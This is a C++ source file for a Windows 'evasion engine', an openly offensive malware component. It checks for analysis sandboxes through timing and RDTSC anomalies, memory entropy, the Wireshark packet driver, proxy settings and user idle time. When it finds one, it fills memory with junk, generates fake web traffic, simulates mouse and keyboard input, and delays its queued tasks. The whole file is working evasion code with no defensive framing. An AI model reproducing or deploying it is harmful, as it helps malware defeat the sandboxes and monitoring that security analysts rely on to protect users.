// evasion_engine.cpp
#include <windows.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <random>

namespace EvasionEngine {

    struct SandboxIndicator {
        bool detected;
        std::wstring reason;
        DWORD score;
    };

    class TimingEvasion {
    private:
        DWORD64 m_startTick;
        DWORD64 m_sleepBias;

        DWORD64 MeasureSleepBias() {
            LARGE_INTEGER freq, start, end;
            QueryPerformanceFrequency(&freq);
            QueryPerformanceCounter(&start);
            Sleep(100);
            QueryPerformanceCounter(&end);

            double elapsed = (double)(end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;
            return (DWORD64)(elapsed - 100.0);
        }

    public:
        TimingEvasion() : m_startTick(0), m_sleepBias(0) {
            m_startTick = GetTickCount64();
            m_sleepBias = MeasureSleepBias();
        }

        bool IsAccelerated() {
            DWORD64 now = GetTickCount64();
            LARGE_INTEGER perfNow;
            QueryPerformanceCounter(&perfNow);

            DWORD64 expectedTime = (DWORD64)((double)perfNow.QuadPart / 10000.0);
            DWORD64 tickTime = now;

            return (expectedTime > tickTime + 5000);
        }

        bool IsSleepTampered() {
            DWORD64 bias = MeasureSleepBias();
            return abs((LONG64)(bias - m_sleepBias)) > 50;
        }

        bool CheckRDTSC() {
            DWORD64 tsc1 = __rdtsc();
            LARGE_INTEGER perf1;
            QueryPerformanceCounter(&perf1);

            std::this_thread::sleep_for(std::chrono::milliseconds(1));

            DWORD64 tsc2 = __rdtsc();
            LARGE_INTEGER perf2;
            QueryPerformanceCounter(&perf2);

            DWORD64 tscDelta = tsc2 - tsc1;
            DWORD64 perfDelta = perf2.QuadPart - perf1.QuadPart;

            return (tscDelta > perfDelta * 10);
        }
    };

    class MemoryEvasion {
    private:
        std::vector<LPVOID> m_allocatedRegions;
        std::mutex m_mutex;

        SIZE_T CalculateEntropy(LPVOID region, SIZE_T size) {
            DWORD frequencies[256] = { 0 };
            BYTE* p = (BYTE*)region;

            for (SIZE_T i = 0; i < size; i++)
                frequencies[p[i]]++;

            double entropy = 0.0;
            for (int i = 0; i < 256; i++) {
                if (frequencies[i] > 0) {
                    double prob = (double)frequencies[i] / size;
                    entropy -= prob * log2(prob);
                }
            }
            return (SIZE_T)(entropy * 100);
        }

    public:
        bool IsMemoryScanned() {
            MEMORY_BASIC_INFORMATION mbi;
            BYTE* addr = (BYTE*)0x10000;

            while (VirtualQuery(addr, &mbi, sizeof(mbi))) {
                if (mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE) {
                    SIZE_T entropy = CalculateEntropy(mbi.BaseAddress, min(mbi.RegionSize, (SIZE_T)4096));
                    if (entropy > 750) {
                        return true;
                    }
                }
                addr = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
            }
            return false;
        }

        void FillWithJunk() {
            std::lock_guard<std::mutex> lock(m_mutex);
            std::random_device rd;
            std::mt19937 rng(rd());
            std::uniform_int_distribution<BYTE> dist(0, 255);

            for (int i = 0; i < 50; i++) {
                SIZE_T size = 1024 * 1024 + (rng() % (1024 * 1024));
                LPVOID region = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (region) {
                    BYTE* p = (BYTE*)region;
                    for (SIZE_T j = 0; j < size; j += 4096) {
                        p[j] = dist(rng);
                    }
                    m_allocatedRegions.push_back(region);
                }
            }
        }

        void CleanJunk() {
            std::lock_guard<std::mutex> lock(m_mutex);
            for (LPVOID region : m_allocatedRegions)
                VirtualFree(region, 0, MEM_RELEASE);
            m_allocatedRegions.clear();
        }
    };

    class NetworkEvasion {
    private:
        bool m_networkSimulated;

        bool CheckWiresharkDrivers() {
            return GetFileAttributesW(L"C:\\Windows\\System32\\drivers\\npf.sys") != INVALID_FILE_ATTRIBUTES;
        }

        bool CheckProxySettings() {
            HKEY hKey;
            if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
                             0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                DWORD proxyEnable = 0;
                DWORD size = sizeof(proxyEnable);
                RegQueryValueExW(hKey, L"ProxyEnable", NULL, NULL, (LPBYTE)&proxyEnable, &size);
                RegCloseKey(hKey);
                return proxyEnable != 0;
            }
            return false;
        }

    public:
        NetworkEvasion() : m_networkSimulated(false) {}

        bool IsMonitored() {
            if (CheckWiresharkDrivers()) return true;
            if (CheckProxySettings()) return true;
            return false;
        }

        void SimulateTraffic() {
            m_networkSimulated = true;
            for (int i = 0; i < 100; i++) {
                SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (s != INVALID_SOCKET) {
                    sockaddr_in addr = { 0 };
                    addr.sin_family = AF_INET;
                    addr.sin_port = htons(80);
                    addr.sin_addr.s_addr = inet_addr("93.184.216.34");

                    connect(s, (sockaddr*)&addr, sizeof(addr));
                    const char* request = "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n";
                    send(s, request, strlen(request), 0);

                    char buffer[1024];
                    recv(s, buffer, sizeof(buffer), 0);
                    closesocket(s);
                }
            }
        }
    };

    class UserInteractionEvasion {
    private:
        bool m_interacted;
        DWORD64 m_lastInteraction;

        void SimulateMouseMovement() {
            POINT pos;
            GetCursorPos(&pos);

            for (int i = 0; i < 50; i++) {
                pos.x += (rand() % 5) - 2;
                pos.y += (rand() % 5) - 2;
                SetCursorPos(pos.x, pos.y);
                std::this_thread::sleep_for(std::chrono::milliseconds(10));
            }
        }

        void SimulateKeyboardInput() {
            keybd_event(VK_SHIFT, 0, 0, 0);
            std::this_thread::sleep_for(std::chrono::milliseconds(50));
            keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0);
        }

    public:
        UserInteractionEvasion() : m_interacted(false), m_lastInteraction(0) {}

        bool CheckIdleTime() {
            LASTINPUTINFO lii = { sizeof(lii) };
            GetLastInputInfo(&lii);
            return (GetTickCount() - lii.dwTime) > 300000;
        }

        void SimulateInteraction() {
            SimulateMouseMovement();
            SimulateKeyboardInput();
            m_interacted = true;
            m_lastInteraction = GetTickCount64();
        }
    };

    class SandboxDetector {
    private:
        TimingEvasion m_timing;
        MemoryEvasion m_memory;
        NetworkEvasion m_network;
        UserInteractionEvasion m_user;
        SandboxIndicator m_indicator;

    public:
        SandboxDetector() { ZeroMemory(&m_indicator, sizeof(m_indicator)); }

        SandboxIndicator Detect() {
            m_indicator.detected = false;
            m_indicator.score = 0;

            if (m_timing.IsAccelerated()) {
                m_indicator.detected = true;
                m_indicator.reason += L"Accelerated time; ";
                m_indicator.score += 30;
            }

            if (m_timing.IsSleepTampered()) {
                m_indicator.detected = true;
                m_indicator.reason += L"Sleep tampering; ";
                m_indicator.score += 25;
            }

            if (m_timing.CheckRDTSC()) {
                m_indicator.score += 15;
            }

            if (m_memory.IsMemoryScanned()) {
                m_indicator.detected = true;
                m_indicator.reason += L"Memory scanning; ";
                m_indicator.score += 20;
            }

            if (m_network.IsMonitored()) {
                m_indicator.reason += L"Network monitoring; ";
                m_indicator.score += 10;
            }

            if (m_user.CheckIdleTime()) {
                m_indicator.reason += L"Long idle time; ";
                m_indicator.score += 10;
            }

            if (m_indicator.score >= 50)
                m_indicator.detected = true;

            return m_indicator;
        }

        void EvadeDetection() {
            m_memory.FillWithJunk();
            m_network.SimulateTraffic();
            m_user.SimulateInteraction();
        }
    };

    class ExecutorDelay {
    private:
        std::vector<std::function<void()>> m_tasks;
        std::mutex m_mutex;
        std::thread m_worker;
        bool m_running;

        void WorkerLoop() {
            while (m_running) {
                std::this_thread::sleep_for(std::chrono::seconds(1));
                std::lock_guard<std::mutex> lock(m_mutex);
                if (!m_tasks.empty()) {
                    auto task = m_tasks.front();
                    m_tasks.erase(m_tasks.begin());
                    task();
                }
            }
        }

    public:
        ExecutorDelay() : m_running(false) {}

        void Start() {
            m_running = true;
            m_worker = std::thread(&ExecutorDelay::WorkerLoop, this);
        }

        void Stop() {
            m_running = false;
            if (m_worker.joinable())
                m_worker.join();
        }

        void AddDelayedTask(std::function<void()> task) {
            std::lock_guard<std::mutex> lock(m_mutex);
            m_tasks.push_back(task);
        }
    };

    SandboxDetector g_sandboxDetector;
    ExecutorDelay g_executorDelay;

    void InitializeEvasion() {
        if (g_sandboxDetector.Detect().detected) {
            g_sandboxDetector.EvadeDetection();
            Sleep(10000);
        }
        g_executorDelay.Start();
    }
}
